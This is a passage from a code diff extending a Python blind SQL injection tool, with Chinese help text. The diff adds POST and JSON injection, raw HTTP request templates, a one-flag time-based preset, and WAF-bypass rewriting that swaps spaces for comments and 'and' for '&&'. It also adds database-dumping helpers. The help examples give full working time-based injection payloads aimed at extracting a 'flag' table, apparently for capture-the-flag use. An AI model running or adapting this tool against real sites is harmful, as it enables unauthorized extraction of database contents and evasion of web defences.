                 data = extract_value(
                     session,
                     cfg,
-                    f"select group_concat({esc_ident(col)} SEPARATOR 0x7c) "
-                    f"from {esc_ident(db)}.{esc_ident(tbl)}",
+                    f"select group_concat({esc_ident_safe(col)} SEPARATOR 0x7c) "
+                    f"from {esc_ident_safe(db)}.{esc_ident_safe(tbl)}",
                     f"数据 {db}.{tbl}.{col}",
                     length_cap=RESULT_DUMP_CAP,
                 )
@@ -1769,12 +2338,7 @@ def dump_flag_search(cfg: Config, keyword: str) -> None:
     pattern = re.compile(re.escape(keyword), re.IGNORECASE)
     hits = 0
 
-    dbs_raw = extract_value(
-        session,
-        cfg,
-        "select group_concat(schema_name SEPARATOR 0x7c) from information_schema.schemata",
-        "数据库列表",
-    )
+    dbs_raw = extract_database_list(session, cfg)
     dbs = split_value(dbs_raw)
     if not dbs:
         print("[!] 未发现任何数据库。")
@@ -1810,8 +2374,8 @@ def dump_flag_search(cfg: Config, keyword: str) -> None:
                 data = extract_value(
                     session,
                     cfg,
-                    f"select group_concat({esc_ident(col)} SEPARATOR 0x7c) "
-                    f"from {esc_ident(db)}.{esc_ident(tbl)}",
+                    f"select group_concat({esc_ident_safe(col)} SEPARATOR 0x7c) "
+                    f"from {esc_ident_safe(db)}.{esc_ident_safe(tbl)}",
                     f"搜索 {db}.{tbl}.{col}",
                     length_cap=RESULT_DUMP_CAP,
                 )
@@ -1838,20 +2402,97 @@ def build_query(args) -> Tuple[str, str]:
     return query, charset
 
 
-def sanitize_url(url: str) -> str:
-    """去掉 URL 自带的查询串，避免与注入参数重复提交造成歧义。"""
+def sanitize_url(url: str, inject_param: str) -> Tuple[str, Dict[str, str]]:
+    """拆分 URL 自带查询串：剔除注入参数（避免重复提交造成歧义），其余作为固定参数保留。
+
+    返回 (不含查询串的 URL, 残余查询参数)。GET 时残余参数会合并进 params，
+    POST 时会作为 URL 查询串保留（例如 ?action=login），从而兼容各种表单接口。
+    """
     parts = urlsplit(url)
+    base_params: Dict[str, str] = {}
     if parts.query:
-        print(f"[!] URL 自带查询串将被忽略: {parts.query!r}")
-        return urlunsplit((parts.scheme, parts.netloc, parts.path, "", parts.fragment))
-    return url
+        dropped = False
+        for key, value in parse_qsl(parts.query, keep_blank_values=True):
+            if key == inject_param:
+                dropped = True
+                continue
+            base_params[key] = value
+        if dropped:
+            print(f"[!] URL 查询串中的注入参数 {inject_param!r} 将被 payload 覆盖")
+        if base_params:
+            print(f"[*] URL 自带查询参数将保留: {base_params}")
+    clean_url = urlunsplit((parts.scheme, parts.netloc, parts.path, "", parts.fragment))
+    return clean_url, base_params
+
+
+def _argv_has(name: str) -> bool:
+    """判断命令行里是否显式出现过某个选项（兼容 --x v 与 --x=v 两种写法）。"""
+    return any(a == name or a.startswith(name + "=") for a in sys.argv)
+
+
+def apply_preset(args) -> None:
+    """把 --preset 展开成一组现成参数，省去手写 payload 模板。"""
+    preset = getattr(args, "preset", None)
+    if not preset:
+        return
+    if preset == "uri":
+        if "*" not in args.url and not args.raw_request:
+            print("[!] --preset uri 需要 -u 里带 * 或配合 --raw-request 使用，否则不会进入原始请求模式。")
+        args.time_based = True
+        args.waf_safe = True
+        if not _argv_has("--sleep-time"):
+            args.sleep_time = 1.2
+        if args.time_payload is None:
+            args.time_payload = URI_TIME_PAYLOAD
+        if args.time_eq_payload is None:
+            args.time_eq_payload = URI_TIME_EQ_PAYLOAD
+        if args.time_len_payload is None:
+            args.time_len_payload = URI_TIME_LEN_PAYLOAD
+        args.payload = args.time_payload
+        args.eq_payload = args.time_eq_payload
+        args.len_payload = args.time_len_payload
+        print(f"[*] 已启用 --preset uri：原始请求注入 + 时间盲注 + 无空格/无等号绕过（sleep={args.sleep_time:g}s）")
 
 
 def build_config(args) -> Config:
     headers = parse_kv(args.headers, ":")
     cookies = parse_kv(args.cookies, "=")
     query, charset = build_query(args)
-    url = sanitize_url(args.url)
+    if args.waf_safe:
+        query = rewrite_sql_waf_safe(query)
+        # 未自定义 payload 时默认走一次 && 闭合探测，避免仍使用 and 模板
+        if args.payload == DEFAULT_PAYLOAD:
+            args.probe_closure = True
+    data = parse_kv(args.data, "=") if args.data else {}
+
+    raw_template: Optional[str] = None
+    raw_host, raw_port, raw_tls = "", 80, False
+    if args.raw_request:
+        # 模式一：从文件读取完整原始 HTTP 请求模板，* 为注入点
+        try:
+            raw_template = Path(args.raw_request).read_text(encoding="utf-8")
+        except OSError as e:
+            raise ValueError(f"无法读取原始请求模板 {args.raw_request!r}: {e}")
+        if "*" not in raw_template:
+            raise ValueError("原始请求模板中缺少注入标记 *（payload 会替换该标记）")
+        raw_host, raw_port, raw_tls = _template_target(raw_template, args.raw_ssl)
+        url = f"raw-request:{args.raw_request}"
+        base_params = {}
+    elif "*" in args.url:
+        # 模式二：-u 直接内联注入标记，按原始请求发送（不重编码，保留 # 等字符）
+        scheme, netloc, rest = _split_url_raw(args.url)
+        raw_tls = scheme.lower() == "https" or args.raw_ssl
+        host, _, port_s = netloc.partition(":")
+        if not host:
+            raise ValueError("URL 缺少主机名")
+        raw_host = host
+        raw_port = int(port_s) if port_s.isdigit() else (443 if raw_tls else 80)
+        raw_template = _compose_raw_template(args.method, netloc, rest, headers, cookies, data)
+        url = f"{scheme}://{netloc}"
+        base_params = {}
+        print(f"[*] 原始请求注入模式：payload 将替换 URL 中的 * （原样发送，不做 URL 编码）")
+    else:
+        url, base_params = sanitize_url(args.url, args.param)
 
     proxies = None
     if args.proxy:
@@ -1877,6 +2518,12 @@ def build_config(args) -> Config:
         raise ValueError("auto-samples 必须 >= 2")
     if args.time_based and args.sleep_time <= 0:
         raise ValueError("sleep-time 必须 > 0")
+    if args.db_predict_prefix < 1:
+        raise ValueError("db-predict-len 必须 >= 1")
+
+    if raw_template and args.probe_closure:
+        print("[!] 原始请求模式下已跳过 --probe-closure：模板自带闭合前后缀，请显式指定 --payload / --eq-payload / --len-payload")
+        args.probe_closure = False
 
     return Config(
         url=url,
@@ -1892,6 +2539,10 @@ def build_config(args) -> Config:
         length_threshold=None,
         status_code=None,
         method=args.method,
+        base_params=base_params,
+        data=data,
+        json_body=args.json_body,
+        content_type=args.content_type,
         timeout=args.timeout,
         retries=args.retries,
         delay=args.delay,
@@ -1924,6 +2575,13 @@ def build_config(args) -> Config:
         time_payload=args.time_payload,
         time_eq_payload=args.time_eq_payload,
         time_len_payload=args.time_len_payload,
+        waf_safe=args.waf_safe,
+        db_predict=args.db_predict,
+        db_predict_prefix=args.db_predict_prefix,
+        raw_template=raw_template,
+        raw_host=raw_host,
+        raw_port=raw_port,
+        raw_tls=raw_tls,
     )
 
 
@@ -1972,6 +2630,10 @@ HELP_EXAMPLES = """\
      python blind_sqli.py -u "http://target/index.php?id=1" --dump       # 跳过系统库
      python blind_sqli.py -u "http://target/index.php?id=1" --dump-all   # 含系统库
 
+     库名枚举默认开启「系统库预判」：库名前 3 位命中 information_schema / mysql /
+     performance_schema / sys 即校验边界后直接补全，省去长名字的逐位猜解；
+     已提取过的库名不会重复预判。关闭：--no-db-predict；调整前缀位数：--db-predict-len N
+
   8) 关键词搜索（表名/列名/数据，不含系统库），命中高亮
      python blind_sqli.py -u "http://target/index.php?id=1" --dump-flag flag
 
@@ -1993,6 +2655,54 @@ HELP_EXAMPLES = """\
          --time-payload "1' and if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0)-- -" \
          --time-eq-payload "1' and if(ascii(substr(({query}),{i},1))={mid},sleep({sleep}),0)-- -" \
          --time-len-payload "1' and if(length(({query}))>{mid},sleep({sleep}),0)-- -"
+
+ 11) POST 注入（表单 / JSON）
+     表单：把注入放在 username，其余字段用 --data 补齐
+     python blind_sqli.py -u "http://target/login.php?action=login" \
+         --method POST -p username \
+         --data "password=1" "submit=Login" \
+         -q "select flag from flag" --probe-closure --auto-mark
+
+     JSON：以 JSON 提交请求体（自动设置 Content-Type: application/json）
+     python blind_sqli.py -u "http://target/api/login" \
+         --method POST --json-body -p username \
+         --data "password=1" \
+         -q "select flag from flag" --probe-closure --auto-mark
+
+     说明：URL 自带的查询串（如 ?action=login）会自动保留；--data 可放任意字段，
+     -p 指定的注入字段由 payload 覆盖（写在 --data 里也一样，会被覆盖，不会报错）。
+
+ 12) 原始请求注入：注入点在请求行 / URL / REQUEST_URI，或需要绕过参数过滤与 WAF
+     模板文件 raw.txt（* 即注入点，payload 替换它，其余按字节原样发送，不做 URL 编码）：
+         POST /?* HTTP/1.1
+         Host: target:8080
+         Content-Type: application/x-www-form-urlencoded
+         Content-Length: 19
+         Connection: close
+
+         username=a&password=b
+
+     注入点落在请求行上时，请求行不能含空格；若 WAF 只检查参数“值”，还可让查询串不含 =
+     （整串成为“无值参数”，值检查自然落空）。此时 payload 模板用注释当空格、用 > 比较：
+     python blind_sqli.py --raw-request raw.txt \
+         -q "select/**/flag/**/from/**/flag" --time-based --sleep-time 3 \
+         --time-payload "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#" \
+         --time-eq-payload "x',if(ascii(substr(({query}),{i},1))like/**/{mid},sleep({sleep}),0))#" \
+         --time-len-payload "x',if(length(({query}))>{mid},sleep({sleep}),0))#" \
+         --max-len 64 --non-interactive
+
+     也可直接内联到 -u（URL 里带 * 即自动进入原始请求模式，* 无需编码）：
+     python blind_sqli.py -u "http://target:8080/?*" --method POST \
+         --data "username=a" "password=b" -q "select/**/flag/**/from/**/flag" \
+         --time-based --sleep-time 3 \
+         --time-payload "x',if(ascii(substr(({query}),{i},1))>{mid},sleep({sleep}),0))#" \
+         --time-len-payload "x',if(length(({query}))>{mid},sleep({sleep}),0))#"
+
+ 13) 懒人模式：上面的 12) 一行搞定（--preset uri 自动填好三个 payload 模板 + 时间盲注 + 紧凑化 -q）
+     python blind_sqli.py --preset uri \
+         -u "http://target:8080/?*" --method POST --data "username=a" "password=b" \
+         -q "select group_concat(flag) from target_table" --non-interactive
+     -q 里正常写带空格的 SQL 即可，脚本会自动转成 /**/；sleep 默认 1.2s（可用 --sleep-time 覆盖）
 """
 
 
@@ -2012,6 +2722,14 @@ def parse_args():
     basic.add_argument("--len-payload", default=DEFAULT_LEN_PAYLOAD, help="长度判断 payload 模板；特殊闭合方式时建议显式指定")
     basic.add_argument("--true-mark", default=DEFAULT_TRUE_MARK, help="条件为真时响应中包含的特征字符串")
 
+    preset = parser.add_argument_group("懒人预设")
+    preset.add_argument(
+        "--preset",
+        choices=["uri"],
+        help="一键套用常用场景参数。uri = 原始请求(URL/REQUEST_URI)注入 + 时间盲注 + 无空格/无等号 WAF 绕过；"
+             "配合 -u \"http://host/?*\" 即可，其余 payload 模板自动填好",
+    )
+
     detect = parser.add_argument_group("特征自动识别")
     detect.add_argument("--auto-mark", action="store_true", help="自动识别 true/false 响应特征")
     detect.add_argument("--true-payload", default=DEFAULT_TRUE_PAYLOAD, help="自动识别时使用的永真 payload")
@@ -2022,7 +2740,23 @@ def parse_args():
     detect.add_argument("--no-normalize", action="store_true", help="自动识别时不压缩空白/移除 HTML 注释")
 
     request = parser.add_argument_group("请求控制")
-    request.add_argument("--method", default="GET", choices=["GET", "POST"], help="HTTP 方法")
+    request.add_argument("--method", "-X", default="GET", choices=["GET", "POST"], help="HTTP 方法（GET / POST）")
+    request.add_argument(
+        "--data",
+        "-d",
+        nargs="+",
+        metavar="k=v",
+        help="附加请求参数：GET 时并入查询串，POST 时并入表单体/JSON 体（可多个，不要包含注入参数）",
+    )
+    request.add_argument("--json-body", action="store_true", help="POST 时以 JSON 方式提交请求体（自动设置 application/json）")
+    request.add_argument("--content-type", help="POST 表单体的 Content-Type，默认由 requests 自动设置")
+    request.add_argument(
+        "--raw-request",
+        metavar="FILE",
+        help="原始 HTTP 请求模板文件（* 处替换为 payload，按字节原样发送，不做 URL 编码）；"
+             "适合注入点在 URL / REQUEST_URI / 需要绕过编码与 WAF 的题",
+    )
+    request.add_argument("--raw-ssl", action="store_true", help="原始请求模式强制使用 HTTPS")
     request.add_argument("--timeout", type=float, default=DEFAULT_TIMEOUT, help="请求超时秒数")
     request.add_argument("--retries", type=int, default=DEFAULT_RETRIES, help="请求失败重试次数")
     request.add_argument("--delay", type=float, default=DEFAULT_DELAY, help="固定延迟秒数")
@@ -2040,6 +2774,7 @@ def parse_args():
     extract.add_argument("--check-boundary", action="store_true", help="启用字符集边界预检；字符集不完整时更稳，但会增加请求")
     extract.add_argument("--probe-closure", action="store_true", help="自动探测基础闭合方式，并生成 payload / eq-payload / len-payload")
     extract.add_argument("--probe-samples", type=int, default=2, help="闭合方式探测时每个候选真/假请求采样次数")
+    extract.add_argument("--waf-safe", action="store_true", help="强制启用 && / /**/ 紧凑模式：兼容拦截空格和 and 的 WAF，自动尝试数字型与字符型 && 闭合")
     extract.add_argument("--no-length-detect", action="store_true", help="跳过长度探测")
     extract.add_argument("--resume", help="断点续传文件路径，例如 result.tmp")
     extract.add_argument("--save-every", type=int, default=5, help="断点文件每完成 N 位保存一次")
@@ -2069,6 +2804,20 @@ def parse_args():
         default=None,
         metavar="URL",
         help="查看历史 dump 记录（可不带地址，列出全部）",
+    )
+    enum.add_argument(
+        "--no-db-predict",
+        dest="db_predict",
+        action="store_false",
+        help="关闭系统库名预判（默认开启：库名前缀命中 information_schema / mysql / performance_schema / sys 时直接补全）",
+    )
+    enum.add_argument(
+        "--db-predict-len",
+        dest="db_predict_prefix",
+        type=int,
+        default=DEFAULT_DB_PREDICT_PREFIX,
+        metavar="N",
+        help="系统库预判所需的最短前缀位数（默认 3）",
     )
 
     misc = parser.add_argument_group("其他")
@@ -2105,6 +2854,7 @@ def main() -> int:
             rc = view_history(args.view or None)
             wait_on_exit()
             return rc
+        apply_preset(args)
         cfg = build_config(args)
     except SystemExit:
         # --help / --version 由 argparse 直接退出，双击场景下同样停留
@@ -2116,7 +2866,14 @@ def main() -> int:
         return 2
 
     print(f"[*] 目标: {cfg.url}")
-    print(f"[*] 参数: {cfg.param}")
+    if cfg.raw_template:
+        print(f"[*] 模式: 原始请求注入（{cfg.raw_host}:{cfg.raw_port}{'，TLS' if cfg.raw_tls else ''}）")
+    else:
+        print(f"[*] 参数: {cfg.param}")
+        if cfg.method.upper() == "POST":
+            body_kind = "JSON" if cfg.json_body else "表单"
+            extra = f"，附加字段 {list(cfg.data)}" if cfg.data else ""
+            print(f"[*] 方法: POST（{body_kind}体{extra}）")
     print(f"[*] 查询: {cfg.query}")
     if cfg.time_based:
         print(f"[*] 模式: 时间盲注 (sleep={cfg.sleep_time}s)")
